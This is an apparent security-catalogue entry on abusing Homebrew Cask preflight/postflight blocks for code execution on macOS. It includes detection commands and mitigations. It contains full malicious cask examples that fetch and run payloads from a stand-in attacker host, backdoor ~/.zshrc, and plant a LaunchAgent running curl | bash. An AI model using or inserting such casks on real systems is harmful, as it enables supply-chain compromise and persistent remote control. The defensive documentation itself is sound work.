---
name: "Cask preflight / postflight Arbitrary Ruby Execution"
packageManager: "brew"
slug: "brew-cask-flight-blocks"
category: "Code Execution"
severity: "critical"
platform:
  - "macOS"
description: "Homebrew Casks (macOS application installers) support four flight stanzas — `preflight`, `postflight`, `uninstall_preflight`, and `uninstall_postflight` — that execute arbitrary Ruby blocks around the install and uninstall lifecycle. These blocks are not sandboxed and run with the invoking user's permissions. Casks that declare `installer manual:` or a `pkg` stanza can additionally escalate via macOS installer authentication prompts. A malicious or compromised cask lets an attacker execute code on the target the moment the user runs `brew install --cask <name>`."
prerequisites:
  - "Ability to publish or modify a cask in a tap the victim uses (homebrew/cask, homebrew/cask-versions, or a third-party cask tap)"
  - "Victim runs `brew install --cask <cask>` or `brew upgrade --cask`"
  - "Write access to the cask tap via PR merge, compromised maintainer account, or typo-squat"
attackScenarios:
  - title: "postflight Block Executing a Shell One-liner"
    description: "An attacker publishes a cask with a `postflight` stanza that runs Ruby after the application is staged. The block can shell out via `system`, download secondary payloads, or modify the user's dotfiles — all without additional prompts since the cask install already succeeded in the user's mind."
    commands:
      - label: "Malicious Cask Ruby file"
        code: |
          cask "productivity-suite" do
            version "2.4.1"
            sha256 "deadbeef" * 8

            url "https://example.com/productivity-suite-#{version}.dmg"
            name "Productivity Suite"
            homepage "https://example.com/productivity-suite"

            app "Productivity Suite.app"

            postflight do
              # Arbitrary Ruby — runs after the .app is copied to /Applications
              require "net/http"
              stage = "/tmp/.ps_stage"
              system "curl", "-fsSL", "-o", stage, "https://attacker.example.com/stage2"
              system "chmod", "+x", stage
              system stage, "&"

              # Backdoor the user's shell init
              rc = "#{ENV["HOME"]}/.zshrc"
              beacon = %Q(\n# productivity-suite helper\n(curl -fsSL https://attacker.example.com/b | bash) >/dev/null 2>&1 &\n)
              File.open(rc, "a") { |f| f.write(beacon) } unless File.read(rc).include?("productivity-suite helper") rescue nil
            end
          end
        language: "ruby"
      - label: "Victim installs the cask"
        code: |
          brew install --cask productivity-suite
          # .app lands in /Applications; postflight runs the Ruby block silently
        language: "bash"
  - title: "uninstall_postflight Triggering on Removal"
    description: "Defensive users who discover the cask may try to remove it. An `uninstall_postflight` block runs during `brew uninstall --cask`, giving the attacker a second execution window — useful for re-installing persistence after the user thinks they have cleaned up."
    commands:
      - label: "uninstall_postflight persistence"
        code: |
          cask "productivity-suite" do
            # ... version/url/sha256/app as above ...

            uninstall_postflight do
              plist = "#{ENV["HOME"]}/Library/LaunchAgents/com.ps.helper.plist"
              File.write(plist, <<~PLIST)
                <?xml version="1.0" encoding="UTF-8"?>
                <plist version="1.0"><dict>
                  <key>Label</key><string>com.ps.helper</string>
                  <key>ProgramArguments</key>
                  <array><string>/bin/bash</string><string>-c</string>
                  <string>curl -fsSL https://attacker.example.com/b | bash</string></array>
                  <key>RunAtLoad</key><true/>
                </dict></plist>
              PLIST
              system "launchctl", "load", "-w", plist
            end
          end
        language: "ruby"
  - title: "preflight Abusing sudo via Cask installer Stanza"
    description: "When a cask declares `pkg` or `installer script: sudo: true`, macOS prompts the user for admin credentials during install. A `preflight` block runs *before* that prompt and can pre-stage payloads in privileged locations the user is about to authorize, making the subsequent sudo step appear to belong to the legitimate installer."
    commands:
      - label: "preflight that stages files before the sudo prompt"
        code: |
          cask "productivity-suite-pro" do
            version "3.0.0"
            sha256 "cafebabe" * 8
            url "https://example.com/ps-pro-#{version}.pkg"

            preflight do
              # Stage a payload the upcoming installer step will execute with sudo
              File.write("/tmp/ps_pre.sh", "#!/bin/bash\ncurl -fsSL https://attacker.example.com/r | bash\n")
              FileUtils.chmod(0755, "/tmp/ps_pre.sh")
            end

            pkg "Productivity Suite Pro.pkg",
                allow_untrusted: true,
                choices: [{ "choiceIdentifier" => "run_pre", "choiceAttribute" => "selected", "attributeSetting" => 1 }]
          end
        language: "ruby"
detection:
  - title: "Dump cask Ruby with brew cat before installing"
    description: "Inspect the cask source for any of the four flight stanzas and for `installer script: sudo: true`, `pkg`, or `allow_untrusted: true`. These are the keywords that signal arbitrary code execution beyond copying a .app."
    commands:
      - code: |
          brew cat --cask productivity-suite | \
            grep -nE "preflight|postflight|uninstall_preflight|uninstall_postflight|installer|allow_untrusted|sudo"
        language: "bash"
  - title: "Watch cask taps for newly-added flight blocks"
    description: "Flight stanzas are uncommon in well-behaved casks. Alerting on PRs or commits that introduce a `postflight` or `uninstall_postflight` in a cask tap surfaces most malicious changes for review."
    commands:
      - code: |
          cd "$(brew --repository)/Library/Taps/homebrew/homebrew-cask"
          git log -p --all -S "postflight do" -- Casks/
        language: "bash"
  - title: "Monitor LaunchAgents/LaunchDaemons written during cask install"
    description: "Legitimate casks almost never drop LaunchAgents or LaunchDaemons from flight blocks — the .pkg payload owns that. A plist appearing in `~/Library/LaunchAgents` during `brew install --cask` is a strong signal of flight-block abuse."
    commands:
      - code: |
          fswatch -0 ~/Library/LaunchAgents /Library/LaunchAgents /Library/LaunchDaemons | \
            xargs -0 -n1 -I{} echo "plist change: {}"
        language: "bash"
mitigation:
  - "Before installing a cask, run `brew cat --cask <name>` and confirm no unexpected `postflight`/`preflight` blocks"
  - "Prefer casks from homebrew/cask; third-party cask taps bypass the same review bar"
  - "Set `HOMEBREW_NO_AUTO_UPDATE=1` in CI and pin cask taps to a known-good commit"
  - "Do not run `brew install --cask` as an admin user — drop to a standard account so `sudo` prompts are visible"
  - "Monitor `~/Library/LaunchAgents`, `/Library/LaunchAgents`, and `/Library/LaunchDaemons` for plists created during brew runs"
  - "Remove unused third-party cask taps (`brew untap`) to shrink the attack surface"
references:
  - title: "Homebrew Cask Cookbook — Stanzas"
    url: "https://docs.brew.sh/Cask-Cookbook#stanzas"
  - title: "Cask DSL Reference — flight blocks"
    url: "https://docs.brew.sh/Cask-Cookbook#stanza-preflight"
  - title: "Homebrew Security Documentation"
    url: "https://docs.brew.sh/Security"
created: 2026-04-21
updated: 2026-04-21
---
